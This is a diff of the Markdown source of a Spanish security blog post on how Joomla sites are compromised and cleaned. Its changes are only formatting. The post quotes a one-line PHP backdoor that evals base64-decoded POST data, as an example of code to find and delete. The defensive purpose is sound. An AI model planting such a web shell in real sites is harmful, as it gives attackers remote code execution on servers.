@@ -3,8 +3,8 @@ title: Como es atacado un sistema Joomla (2º Parte)
 date: 2012-06-18
 description: Descubre cómo los atacantes comprometen sitios Joomla, los métodos utilizados para modificar archivos críticos y cómo proteger tu sitio eliminando código malicioso y reforzando la seguridad.
 author: Francisco Javier Félix Belmonte
-image: 'como-es-atacado-un-joomla-2-parte'
-category: 'blog'
+image: "como-es-atacado-un-joomla-2-parte"
+category: "blog"
 tags: [joomla, ataques, cms]
 isDraft: false
 ---
@@ -39,10 +39,10 @@ copia no alterada.
 Luego buscaríamos estos patrones en el resto de ficheros y también podemos buscar por fecha de modificación.
 
 Hay que estar atento a los ficheros modificados, porque también pueden incluir una puerta trasera. Y aunque limpiemos
-los ficheros o activemos sistemas de seguridad como [**suhosin**](https://www.hardened-php.net/suhosin/index.html) o [*
-*mod_security**](https://www.modsecurity.org/), hay que buscar este código y eliminarlo.
-(*suhosin permite limitar el uso de `eval`, pero se necesitan conocimientos porque se podría dejar de funcionar ciertas
-partes de nuestra web.*)
+los ficheros o activemos sistemas de seguridad como [**suhosin**](https://www.hardened-php.net/suhosin/index.html) o [\*
+\*mod_security\*\*](https://www.modsecurity.org/), hay que buscar este código y eliminarlo.
+(_suhosin permite limitar el uso de `eval`, pero se necesitan conocimientos porque se podría dejar de funcionar ciertas
+partes de nuestra web._)
 
 ```php
 <?php if ($_POST["php"]){eval(base64_decode($_POST["php"]));exit;} ?>
